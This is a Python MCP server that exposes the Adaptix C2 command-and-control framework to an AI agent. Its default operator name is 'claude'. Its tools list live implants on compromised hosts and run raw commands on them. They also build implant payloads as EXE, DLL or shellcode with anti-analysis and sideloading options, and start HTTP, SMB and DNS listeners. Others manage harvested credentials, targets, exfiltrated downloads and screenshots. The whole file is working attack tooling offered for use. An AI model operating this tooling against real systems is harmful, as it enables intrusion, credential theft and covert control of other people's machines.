import requests
import websocket
import time
import ssl
import json
import fcntl
from mcp.server.fastmcp import FastMCP
import threading
import struct
import base64
import os
import sys

server = FastMCP("Adaptix c2")

_slot_handles = []


def _allocate_operator(start=None):
    """When ADAPTIX_USERNAME=auto, take an exclusive slot so concurrent MCP
    processes use different operator accounts (no 511 single-session clash)."""
    raw = os.environ.get("ADAPTIX_USERNAME", "claude").strip()
    if raw.lower() not in ("auto", "mcp*", "*"):
        return raw
    slot_dir = os.environ.get("ADAPTIX_SLOT_DIR", "/opt/adaptix-mcp/slots")
    if start is None:
        try:
            start = int(os.environ.get("ADAPTIX_SLOT_START", "1"))
        except ValueError:
            start = 1
    count = int(os.environ.get("ADAPTIX_SLOT_COUNT", "128"))
    try:
        os.makedirs(slot_dir, exist_ok=True)
    except Exception:
        return "mcp"
    for i in range(start, start + count):
        path = os.path.join(slot_dir, "slot%03d.lock" % i)
        handle = open(path, "w")
        try:
            fcntl.flock(handle.fileno(), fcntl.LOCK_EX | fcntl.LOCK_NB)
        except OSError:
            handle.close()
            continue
        _slot_handles.append(handle)  # keep fd open for process lifetime
        return "mcp%03d" % i
    return "mcp"


def _release_slot():
    """Release the most recently taken slot (used when the server rejects it)."""
    while _slot_handles:
        handle = _slot_handles.pop()
        try:
            fcntl.flock(handle.fileno(), fcntl.LOCK_UN)
        except Exception:
            pass
        try:
            handle.close()
        except Exception:
            pass
        return True
    return False


def _next_slot_number(user):
    if user.startswith("mcp") and user[3:].isdigit():
        return int(user[3:]) + 1
    return 1


def _ws_probe():
    """Open and immediately close a WebSocket to prove the operator slot is
    usable server-side. Catches stale sessions left behind by killed processes
    (HTTP 511 "Client already connected"), which a file lock cannot see."""
    otp = generate_connect_otp()
    if not otp:
        return False
    try:
        probe = websocket.create_connection(
            f"wss://{endpoint}/connect?otp={otp}",
            timeout=8,
            sslopt={"cert_reqs": ssl.CERT_NONE},
        )
        probe.close()
        time.sleep(0.3)
        return True
    except Exception:
        return False


def _connect_with_failover(max_attempts=8):
    """Log in and pick an operator slot whose WebSocket handshake is accepted."""
    global username, auth_token
    raw = os.environ.get("ADAPTIX_USERNAME", "").strip().lower()
    start = None
    for _ in range(max_attempts):
        _release_slot()
        username = _allocate_operator(start)
        auth_token = ""
        token = login()
        if isinstance(token, dict) and token.get("access_token"):
            auth_token = token["access_token"]
            if _ws_probe():
                return True
        start = _next_slot_number(username)
        if raw not in ("auto", "mcp*", "*"):
            return False
    return False


username = _allocate_operator()
password = os.environ.get("ADAPTIX_PASSWORD", "claude")
endpoint = os.environ.get("ADAPTIX_ENDPOINT", "127.0.0.1:4321/endpoint")
auth_token = ""
live_agents = {}  # agent_id -> agent info dict
global_ws = None
# Per-agent command capture. Console packets carry a_id, so output from one
# agent can never be appended to another agent's in-flight command.
_captures = {}          # agent_id -> {"buf": str, "done": bool}
_captures_lock = threading.Lock()
_agent_locks = {}       # agent_id -> threading.Lock
chat_messages = []
last_seen_chat_index = 0


def _agent_lock(agent_id):
    with _captures_lock:
        lock = _agent_locks.get(agent_id)
        if lock is None:
            lock = threading.Lock()
            _agent_locks[agent_id] = lock
        return lock


def _begin_capture(agent_id):
    with _captures_lock:
        _captures[agent_id] = {"buf": "", "done": False}


def _wait_capture(agent_id, timeout):
    waited = 0
    while waited < timeout:
        time.sleep(1)
        waited += 1
        with _captures_lock:
            cap = _captures.get(agent_id)
            if cap is None or cap["done"]:
                break
    with _captures_lock:
        cap = _captures.pop(agent_id, None)
    if cap is None:
        return "Error: command capture lost"
    out = cap["buf"]
    if not cap["done"]:
        out += "\n[timeout waiting for command output]"
    return out


TYPE_SYNC_START = 0x11
TYPE_SYNC_FINISH = 0x12
SP_TYPE_EVENT = 0x13

TYPE_LISTENER_REG = 0x21
TYPE_LISTENER_START = 0x31
TYPE_LISTENER_EDIT = 0x32
TYPE_LISTENER_STOP = 0x33

TYPE_AGENT_REG = 0x22
TYPE_AGENT_NEW = 0x41
TYPE_AGENT_UPDATE = 0x42
TYPE_AGENT_REMOVE = 0x43
TYPE_AGENT_TICK = 0x44
TYPE_AGENT_LINK = 0x45

TYPE_AGENT_TASK_SYNC = 0x49
TYPE_AGENT_TASK_UPDATE = 0x4A
TYPE_AGENT_TASK_SEND = 0x4B
TYPE_AGENT_TASK_REMOVE = 0x4C

TYPE_DOWNLOAD_CREATE = 0x51
TYPE_DOWNLOAD_UPDATE = 0x52
TYPE_DOWNLOAD_DELETE = 0x53

TYPE_TUNNEL_CREATE = 0x57
TYPE_TUNNEL_EDIT = 0x58
TYPE_TUNNEL_DELETE = 0x59

TYPE_SCREEN_CREATE = 0x5B
TYPE_SCREEN_UPDATE = 0x5C
TYPE_SCREEN_DELETE = 0x5D

TYPE_BROWSER_DISKS = 0x61
TYPE_BROWSER_FILES = 0x62
TYPE_BROWSER_STATUS = 0x63
TYPE_BROWSER_PROCESS = 0x64

TYPE_AGENT_CONSOLE_OUT = 0x69
TYPE_AGENT_CONSOLE_TASK_SYNC = 0x6A
TYPE_AGENT_CONSOLE_TASK_UPD = 0x6B

TYPE_PIVOT_CREATE = 0x71
TYPE_PIVOT_DELETE = 0x72

TYPE_CHAT_MESSAGE = 0x18


######################### Websocket


def on_message(ws, message):
    # custom_log("--- on message")
    # custom_log(message)
    cur_msg = json.loads(message.decode())
    # custom_log(f"msgid : {cur_msg["type"] }")
    if cur_msg["type"] == TYPE_AGENT_REG:
        name = cur_msg.get("agent", "")
        groups = cur_msg.get("groups", [])
        agent_commands[name] = groups

    if cur_msg["type"] == TYPE_CHAT_MESSAGE:
        chat_messages.append({
            "username": cur_msg.get("c_username", ""),
            "message": cur_msg.get("c_message", ""),
            "date": cur_msg.get("c_date", 0),
        })

    if cur_msg["type"] == TYPE_AGENT_NEW:
        aid = cur_msg.get("a_id", "")
        live_agents[aid] = {
            "id": aid,
            "name": cur_msg.get("a_name", ""),
            "listener": cur_msg.get("a_listener", ""),
            "computer": cur_msg.get("a_computer", ""),
            "username": cur_msg.get("a_username", ""),
            "os": cur_msg.get("a_os", 0),
            "arch": cur_msg.get("a_arch", ""),
            "pid": cur_msg.get("a_pid", ""),
            "process": cur_msg.get("a_process", ""),
            "internal_ip": cur_msg.get("a_internal_ip", ""),
            "external_ip": cur_msg.get("a_external_ip", ""),
            "elevated": cur_msg.get("a_elevated", False),
        }

    if cur_msg["type"] == TYPE_AGENT_TICK:
        for aid in cur_msg.get("a_id", []):
            if aid in live_agents:
                live_agents[aid]["last_tick"] = time.time()
            else:
                live_agents[aid] = {"id": aid}

    if cur_msg["type"] == TYPE_AGENT_REMOVE:
        aid = cur_msg.get("a_id", "")
        live_agents.pop(aid, None)

    if (
        cur_msg["type"] == TYPE_AGENT_CONSOLE_OUT
        or cur_msg["type"] == TYPE_AGENT_CONSOLE_TASK_UPD
    ):
        aid = cur_msg.get("a_id", "")
        target = None
        with _captures_lock:
            if aid:
                target = _captures.get(aid)
            elif len(_captures) == 1:
                # Very old servers may omit a_id; only routable when a single
                # command is in flight, otherwise drop to avoid cross-talk.
                target = next(iter(_captures.values()))
            if target is not None:
                target["buf"] += cur_msg.get("a_message", "") + "\n" + cur_msg.get("a_text", "")
                if cur_msg["type"] == TYPE_AGENT_CONSOLE_TASK_UPD and cur_msg.get("a_completed"):
                    target["done"] = True


def on_error(ws, error):
    pass


def on_close(ws, close_status_code, close_msg):
    pass


def on_open(ws):
    global global_ws
    global_ws = ws
    threading.Thread(target=_initial_sync, daemon=True).start()


def _initial_sync():
    # Race: the server may not have registered this WS client yet when on_open
    # fires, so the first /sync can land before subscriptions exist. Retry a
    # few seconds later so presync (agents, extenders, commands) is delivered.
    for _ in range(3):
        time.sleep(1.5)
        try:
            sync()
            subscribe_categories(["extenders", "chat_history", "chat_realtime", "agents", "agents_only_active"])
        except Exception:
            pass


def sync():
    # custom_log("executing sync")
    burp0_url = f"https://{endpoint}/sync"
    burp0_headers = {
        "content-type": "application/json",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate",
        "accept-language": "en-US,*",
        "user-agent": "Mozilla/5.0",
        "Authorization": f"Bearer {auth_token}",
    }
    burp0_json = {}
    requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    # custom_log(r.content)


def subscribe_categories(categories):
    url = f"https://{endpoint}/subscribe"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_token}",
    }
    payload = {"categories": categories}
    requests.post(url, headers=headers, json=payload, verify=False)


def login():
    burp0_url = f"https://{endpoint}/login"
    burp0_headers = {
        "content-type": "application/json",
        "Connection": "close",
        "Accept-Encoding": "gzip, deflate",
        "accept-language": "en-US,*",
        "user-agent": "Mozilla/5.0",
    }
    burp0_json = {"password": password, "username": username}
    r = requests.post(burp0_url, headers=burp0_headers, json=burp0_json, verify=False)
    # custom_log(r.content)
    try:
        return r.json()
    except Exception:
        return r


def add_live_beacon_id(cur_b):
    """Legacy compat — no longer used, kept for reference."""
    pass


def custom_log(msg):
    threading.Thread(
        target=lambda: requests.get(f"http://127.0.0.1:3006/?={msg}")
    ).start()


def generate_connect_otp():
    url = f"https://{endpoint}/otp/generate"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_token}",
    }
    payload = {
        "type": "connect",
        "data": {
            "client_type": 2,
            "subscriptions": ["extenders", "chat_history", "chat_realtime", "agents", "agents_only_active"],
        },
    }
    r = requests.post(url, headers=headers, json=payload, verify=False)
    resp = r.json()
    if resp.get("ok"):
        return resp.get("message")
    return None


def start_websocket_client():
    otp = generate_connect_otp()
    if not otp:
        return
    # custom_log("connecting to ws")
    ws = websocket.WebSocketApp(
        f"wss://{endpoint}/connect?otp={otp}",
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    ws.run_forever(sslopt={"cert_reqs": ssl.CERT_NONE})


def _post_command(agent_id: str, path: str, payload: dict):
    try:
        r = requests.post(
            f"https://{endpoint}{path}",
            headers=_api_headers(),
            json=payload,
            verify=False,
        )
        resp = r.json()
    except Exception as e:
        return f"Error sending command: {e}"
    if not resp.get("ok"):
        return f"Failed: {resp.get('message', 'unknown error')}"
    return None


def _command_timeout() -> int:
    try:
        return int(os.environ.get("ADAPTIX_CMD_TIMEOUT", "300"))
    except ValueError:
        return 300


def send_command_raw(agent_id: str, cmdline: str):
    """Send a raw command to an agent via /agent/command/raw and wait for output."""
    lock = _agent_lock(agent_id)
    if not lock.acquire(timeout=5):
        return "Error: another command is still running on this agent; retry shortly."
    try:
        _begin_capture(agent_id)
        err = _post_command(agent_id, "/agent/command/raw", {"id": agent_id, "cmdline": cmdline})
        if err:
            _wait_capture(agent_id, 0)
            return err
        return _wait_capture(agent_id, _command_timeout())
    finally:
        lock.release()


def send_command_execute(agent_id: str, cmdline: str, args: dict):
    """Send a structured command via /agent/command/execute and wait for output."""
    info = live_agents.get(agent_id) or {}
    agent_name = info.get("name") or os.environ.get("ADAPTIX_AGENT_NAME", "beacon")
    lock = _agent_lock(agent_id)
    if not lock.acquire(timeout=5):
        return "Error: another command is still running on this agent; retry shortly."
    try:
        _begin_capture(agent_id)
        payload = {
            "id": agent_id,
            "name": agent_name,
            "cmdline": cmdline,
            "data": json.dumps(args),
            "ui": False,
            "ax_hook_id": "",
            "ax_handler_id": "",
            "wait_answer": False,
        }
        err = _post_command(agent_id, "/agent/command/execute", payload)
        if err:
            _wait_capture(agent_id, 0)
            return err
        return _wait_capture(agent_id, _command_timeout())
    finally:
        lock.release()


######################### Server Tools - Agent Commands

agent_commands = {}  # agent_name -> list of command groups


@server.tool()
def get_live_beacons():
    """Return all live agent sessions (beacons and gophers) with their details."""
    if not live_agents:
        return "No live agents."
    os_map = {0: "unknown", 1: "Windows", 2: "Linux", 3: "macOS"}
    lines = []
    for aid, info in live_agents.items():
        if len(info) <= 1:
            lines.append(f"  {aid} (tick only, no details)")
            continue
        os_name = os_map.get(info.get("os", 0), "unknown")
        elevated = "*" if info.get("elevated") else ""
        lines.append(
            f"  {aid} | {info.get('name','')} | {info.get('computer','')}"
            f"\\{info.get('username','')}{elevated} | {os_name} {info.get('arch','')}"
            f" | {info.get('process','')} ({info.get('pid','')})"
            f" | {info.get('internal_ip','')} | listener={info.get('listener','')}"
        )
    return "\n".join(lines)


@server.tool()
def chat_get_all():
    """Return all chat messages from the teamserver"""
    if not chat_messages:
        return "No chat messages yet."
    lines = []
    for msg in chat_messages:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(msg["date"]))
        lines.append(f"[{ts}] {msg['username']}: {msg['message']}")
    return "\n".join(lines)


@server.tool()
def chat_get_new():
    """Return only new (unread) chat messages since last check"""
    global last_seen_chat_index
    if last_seen_chat_index >= len(chat_messages):
        return "No new chat messages."
    new_msgs = chat_messages[last_seen_chat_index:]
    last_seen_chat_index = len(chat_messages)
    lines = []
    for msg in new_msgs:
        ts = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(msg["date"]))
        lines.append(f"[{ts}] {msg['username']}: {msg['message']}")
    return "\n".join(lines)


@server.tool()
def chat_send(message: str):
    """Send a chat message to the teamserver"""
    url = f"https://{endpoint}/chat/send"
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_token}",
    }
    r = requests.post(url, headers=headers, json={"message": message}, verify=False)
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Message sent: {message}"
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Agent Generation

PAYLOADS_DIR = os.environ.get("ADAPTIX_PAYLOADS_DIR", os.path.join(os.path.dirname(__file__), "payloads"))


@server.tool()
def agent_generate(agent_type: str, listener_names: str, config: str):
    """Generate an agent payload binary.
    agent_type: "beacon" or "gopher"
    listener_names: comma-separated listener names to embed, e.g. "https-listener,smb"
    config: JSON string with agent build configuration

    Beacon config fields:
      os (str): "windows"
      arch (str): "x64" or "x86"
      format (str): "Exe", "Service Exe", "DLL", or "Shellcode"
      sleep (str): callback interval e.g. "5s", "1m", "30s"
      jitter (int): jitter percentage 0-100
      svcname (str): service name (for Service Exe format)
      is_killdate (bool): enable kill date
      kill_date (str): kill date "YYYY-MM-DD"
      kill_time (str): kill time "HH:MM"
      is_workingtime (bool): enable working hours restriction
      start_time (str): working start "HH:MM"
      end_time (str): working end "HH:MM"
      iat_hiding (bool): IAT hiding for anti-analysis
      is_sideloading (bool): DLL sideloading mode
      sideloading_content (str): base64-encoded sideloading binary
      rotation_mode (str): "round-robin" or "random" listener rotation
      use_proxy (bool): route through proxy
      proxy_type (str): "https" or "socks5"
      proxy_host (str): proxy address
      proxy_port (int): proxy port
      proxy_username (str): proxy auth user
      proxy_password (str): proxy auth password
      user_agent (str): HTTP user-agent string

    Gopher config fields:
      os (str): "windows", "linux", or "macos"
      arch (str): "amd64" or "arm64"
      format (str): output format
      win7_support (bool): Windows 7 compatibility
      reconn_timeout (str): reconnect timeout e.g. "30s"
      reconn_count (int): max reconnect attempts
    """
    listeners = [l.strip() for l in listener_names.split(",") if l.strip()]
    r = requests.post(
        f"https://{endpoint}/agent/generate",
        headers=_api_headers(),
        json={"agent": agent_type, "listener_name": listeners, "config": config},
        verify=False,
    )
    try:
        resp = r.json()
        if not resp.get("ok"):
            return f"Failed: {resp.get('message', 'unknown error')}"

        encoded = resp["message"]
        filename_b64, content_b64 = encoded.split(":", 1)
        filename = base64.b64decode(filename_b64).decode()
        content = base64.b64decode(content_b64)

        os.makedirs(PAYLOADS_DIR, exist_ok=True)
        filepath = os.path.join(PAYLOADS_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content)

        return f"Payload saved: {filepath} ({len(content)} bytes)"
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Listeners


def _api_headers():
    return {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {auth_token}",
    }


def _get_listener_type(name: str):
    """Look up listener type by name from the list endpoint."""
    r = requests.get(f"https://{endpoint}/listener/list", headers=_api_headers(), verify=False)
    try:
        listeners = r.json()
        if not listeners:
            return None
        for l in listeners:
            if l.get("l_name") == name:
                return l.get("l_reg_name")
    except Exception:
        pass
    return None


@server.tool()
def listener_list():
    """List all active listeners on the teamserver"""
    r = requests.get(f"https://{endpoint}/listener/list", headers=_api_headers(), verify=False)
    try:
        listeners = r.json()
        if not listeners:
            return "No active listeners."
        lines = []
        for l in listeners:
            status = l.get("l_status", "unknown")
            lines.append(
                f"[{status}] {l.get('l_name')} | type={l.get('l_reg_name')} "
                f"proto={l.get('l_protocol')} bind={l.get('l_bind_host')}:{l.get('l_bind_port')} "
                f"agents={l.get('l_agent_addr')}"
            )
        return "\n".join(lines)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def listener_create(name: str, listener_type: str, config: str):
    """Create and start a new listener.
    name: unique listener name (alphanumeric, dash, underscore only)
    listener_type: one of the registered types below
    config: JSON string with listener-specific configuration (see below)

    Available listener types and their config fields:

    BeaconHTTP:
      host_bind (str): bind address, e.g. "0.0.0.0"
      port_bind (int): bind port, e.g. 443
      callback_addresses (list[str]): agent callback addresses, e.g. ["domain.com:443"]
      encrypt_key (str): 32 hex char encryption key (required)
      ssl (bool): enable HTTPS
      ssl_cert_path (str): path to SSL cert (if ssl=true)
      ssl_key_path (str): path to SSL key (if ssl=true)
      http_method (str): HTTP method, e.g. "POST"
      uri (list[str]): URI paths, e.g. ["/api", "/update"]
      hb_header (str): parameter name for beacon data
      user_agent (list[str]): allowed user agents
      host_header (list[str]): allowed host headers
      server_headers (str): extra response headers, e.g. "Server: nginx"
      x-forwarded-for (bool): trust X-Forwarded-For header

    BeaconSMB:
      pipename (str): named pipe name, e.g. "test" (creates \\\\.\\pipe\\test)
      encrypt_key (str): 32 hex char encryption key (required)

    BeaconTCP:
      port_bind (int): bind port
      encrypt_key (str): 32 hex char encryption key (required)
      prepend_data (str): optional prepend data

    BeaconDNS:
      host_bind (str): bind address
      port_bind (int): bind port (usually 53)
      domain (str): DNS domain for tunneling
      encrypt_key (str): 32 hex char encryption key (required)
      pkt_size (int): DNS packet size
      ttl (int): DNS TTL
      burst_enabled (bool): enable burst mode
      burst_sleep (int): burst sleep ms
      burst_jitter (int): burst jitter ms

    GopherTCP:
      host_bind (str): bind address
      port_bind (int): bind port
      callback_addresses (str): agent callback address
      encrypt_key (str): 32 hex char encryption key (required)
      ssl (bool): enable mTLS
      tcp_banner (str): TCP banner string
      error_answer (str): error response string
      timeout (int): connection timeout seconds
    """
    r = requests.post(
        f"https://{endpoint}/listener/create",
        headers=_api_headers(),
        json={"name": name, "type": listener_type, "config": config},
        verify=False,
    )
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Listener '{name}' created successfully."
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def listener_edit(name: str, config: str):
    """Edit a running listener's configuration.
    name: listener name
    config: JSON string with updated configuration"""
    ltype = _get_listener_type(name)
    if not ltype:
        return f"Listener '{name}' not found."
    r = requests.post(
        f"https://{endpoint}/listener/edit",
        headers=_api_headers(),
        json={"name": name, "type": ltype, "config": config},
        verify=False,
    )
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Listener '{name}' edited."
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def listener_pause(name: str):
    """Pause a running listener (stops accepting new agents)."""
    ltype = _get_listener_type(name)
    if not ltype:
        return f"Listener '{name}' not found."
    r = requests.post(
        f"https://{endpoint}/listener/pause",
        headers=_api_headers(),
        json={"name": name, "type": ltype},
        verify=False,
    )
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Listener '{name}' paused."
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def listener_resume(name: str):
    """Resume a paused listener."""
    ltype = _get_listener_type(name)
    if not ltype:
        return f"Listener '{name}' not found."
    r = requests.post(
        f"https://{endpoint}/listener/resume",
        headers=_api_headers(),
        json={"name": name, "type": ltype},
        verify=False,
    )
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Listener '{name}' resumed."
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def listener_remove(name: str):
    """Remove (stop and delete) a listener."""
    ltype = _get_listener_type(name)
    if not ltype:
        return f"Listener '{name}' not found."
    r = requests.post(
        f"https://{endpoint}/listener/stop",
        headers=_api_headers(),
        json={"name": name, "type": ltype},
        verify=False,
    )
    try:
        resp = r.json()
        if resp.get("ok"):
            return f"Listener '{name}' removed."
        return f"Failed: {resp.get('message', 'unknown error')}"
    except Exception as e:
        return f"Error: {e}"




######################### Server Tools - Agent Console


@server.tool()
def agent_console_remove(agent_ids: str):
    """Clear console output history for agents. agent_ids: comma-separated agent IDs."""
    ids = [i.strip() for i in agent_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/agent/console/remove", headers=_api_headers(), json={"agent_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Console cleared."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def agent_update_data(agent_id: str, data: str):
    """Update agent metadata. agent_id: agent ID. data: JSON string with fields to update.
    Supported fields (all optional):
      internal_ip, external_ip, gmt_offset (int), acp (int), oemcp (int),
      pid, tid, arch, elevated (bool), process, os (int: 0=unknown,1=Win,2=Linux,3=macOS),
      os_desc, domain, computer, username, impersonated, tags, mark, color"""
    payload = json.loads(data)
    payload["agent_id"] = agent_id
    r = requests.post(f"https://{endpoint}/agent/update/data", headers=_api_headers(), json=payload, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Agent data updated."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Tasks (extended)


@server.tool()
def task_hook(agent_id: str, task_id: str, hook_id: str, job_index: int = 0, msg_type: int = 0, message: str = "", text: str = "", completed: bool = False):
    """Trigger an AxScript post-hook callback on a task.
    agent_id: agent ID, task_id: task ID, hook_id: hook ID from AxScript."""
    r = requests.post(f"https://{endpoint}/agent/task/hook", headers=_api_headers(),
        json={"a_id": agent_id, "a_task_id": task_id, "a_hook_id": hook_id,
              "a_job_index": job_index, "a_msg_type": msg_type, "a_message": message,
              "a_text": text, "a_completed": completed}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Hook triggered."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def task_save(agent_id: str, command_line: str, message: str, clear_text: str = "", message_type: int = 0):
    """Save/export task output on the server.
    agent_id: agent ID, command_line: the command that was run, message: output to save."""
    r = requests.post(f"https://{endpoint}/agent/task/save", headers=_api_headers(),
        json={"agent_id": agent_id, "command_line": command_line, "message_type": message_type,
              "message": message, "clear_text": clear_text}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Task saved."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Services


@server.tool()
def service_list():
    """List registered service plugins."""
    r = requests.get(f"https://{endpoint}/service/list", headers=_api_headers(), verify=False)
    try:
        resp = r.json()
        services = resp.get("services", [])
        if not services:
            return "No services registered."
        return json.dumps(services, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def service_call(service_name: str, command: str, args: str = ""):
    """Call a function on a service plugin.
    service_name: registered service name, command: function to call, args: JSON string of arguments."""
    r = requests.post(f"https://{endpoint}/service/call", headers=_api_headers(),
        json={"service": service_name, "command": command, "args": args}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else json.dumps(resp, indent=2)
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Credentials


@server.tool()
def creds_list():
    """List all harvested credentials."""
    r = requests.get(f"https://{endpoint}/creds/list", headers=_api_headers(), verify=False)
    try:
        data = r.json()
        if not data:
            return "No credentials."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def creds_add(username: str, password: str, realm: str = "", cred_type: str = "", tag: str = "", storage: str = "", host: str = ""):
    """Add a credential to the store."""
    cred = {"username": username, "password": password, "realm": realm, "type": cred_type, "tag": tag, "storage": storage, "host": host}
    r = requests.post(f"https://{endpoint}/creds/add", headers=_api_headers(), json={"creds": [cred]}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Credential added."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def creds_edit(cred_id: str, username: str, password: str, realm: str = "", cred_type: str = "", tag: str = "", storage: str = "", host: str = ""):
    """Edit an existing credential."""
    r = requests.post(f"https://{endpoint}/creds/edit", headers=_api_headers(),
        json={"cred_id": cred_id, "username": username, "password": password, "realm": realm, "type": cred_type, "tag": tag, "storage": storage, "host": host}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Credential edited."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def creds_remove(cred_ids: str):
    """Remove credentials. cred_ids: comma-separated credential IDs."""
    ids = [i.strip() for i in cred_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/creds/remove", headers=_api_headers(), json={"cred_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Credentials removed."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def creds_set_tag(cred_ids: str, tag: str):
    """Set tag on credentials. cred_ids: comma-separated credential IDs."""
    ids = [i.strip() for i in cred_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/creds/set/tag", headers=_api_headers(), json={"id_array": ids, "tag": tag}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tag set."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Targets


@server.tool()
def targets_list():
    """List all discovered targets."""
    r = requests.get(f"https://{endpoint}/targets/list", headers=_api_headers(), verify=False)
    try:
        data = r.json()
        if not data:
            return "No targets."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def targets_add(computer: str, address: str, domain: str = "", os_type: int = 0, tag: str = "", info: str = ""):
    """Add a target host. os_type: 0=unknown, 1=Windows, 2=Linux, 3=macOS."""
    target = {"t_computer": computer, "t_address": address, "t_domain": domain, "t_os": os_type, "t_tag": tag, "t_info": info}
    r = requests.post(f"https://{endpoint}/targets/add", headers=_api_headers(), json={"targets": [target]}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Target added."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def targets_edit(target_id: str, computer: str, address: str, domain: str = "", os_type: int = 0, os_desc: str = "", tag: str = "", info: str = "", alive: bool = True):
    """Edit a target."""
    r = requests.post(f"https://{endpoint}/targets/edit", headers=_api_headers(),
        json={"t_target_id": target_id, "t_computer": computer, "t_domain": domain, "t_address": address,
              "t_os": os_type, "t_os_desk": os_desc, "t_tag": tag, "t_info": info, "t_alive": alive}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Target edited."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def targets_remove(target_ids: str):
    """Remove targets. target_ids: comma-separated target IDs."""
    ids = [i.strip() for i in target_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/targets/remove", headers=_api_headers(), json={"target_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Targets removed."
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def targets_set_tag(target_ids: str, tag: str):
    """Set tag on targets. target_ids: comma-separated target IDs."""
    ids = [i.strip() for i in target_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/targets/set/tag", headers=_api_headers(), json={"id_array": ids, "tag": tag}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Tag set."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Downloads


@server.tool()
def downloads_list():
    """List all file downloads."""
    r = requests.get(f"https://{endpoint}/download/list", headers=_api_headers(), verify=False)
    try:
        data = r.json()
        if not data:
            return "No downloads."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def download_sync(file_id: str):
    """Download a completed file by ID. Returns the filename and saves content locally."""
    r = requests.post(f"https://{endpoint}/download/sync", headers=_api_headers(), json={"file_id": file_id}, verify=False)
    try:
        resp = r.json()
        if not resp.get("ok"):
            return f"Failed: {resp.get('message', 'unknown error')}"
        filename = resp.get("filename", "download")
        content = base64.b64decode(resp.get("content", ""))
        os.makedirs(PAYLOADS_DIR, exist_ok=True)
        filepath = os.path.join(PAYLOADS_DIR, filename)
        with open(filepath, "wb") as f:
            f.write(content)
        return f"Downloaded: {filepath} ({len(content)} bytes)"
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def downloads_delete(file_ids: str):
    """Delete downloads. file_ids: comma-separated file IDs."""
    ids = [i.strip() for i in file_ids.split(",") if i.strip()]
    r = requests.post(f"https://{endpoint}/download/delete", headers=_api_headers(), json={"file_id_array": ids}, verify=False)
    try:
        resp = r.json()
        return resp.get("message", "") if not resp.get("ok") else "Downloads deleted."
    except Exception as e:
        return f"Error: {e}"


######################### Server Tools - Screenshots


@server.tool()
def screenshots_list():
    """List all captured screenshots."""
    r = requests.get(f"https://{endpoint}/screen/list", headers=_api_headers(), verify=False)
    try:
        data = r.json()
        if not data:
            return "No screenshots."
        return json.dumps(data, indent=2)
    except Exception as e:
        return f"Error: {e}"


@server.tool()
def screenshot_save(screen_id: str):
    """Save a screenshot image locally by ID. Returns the file path."""
    r = requests.get(f"https://{endpoint}/screen/image", headers=_api_headers(), params={"screen_id": screen_id}, verify=False)
    if r.status_code != 200:
        return f"Failed to get screenshot: HTTP {r.status_code}"
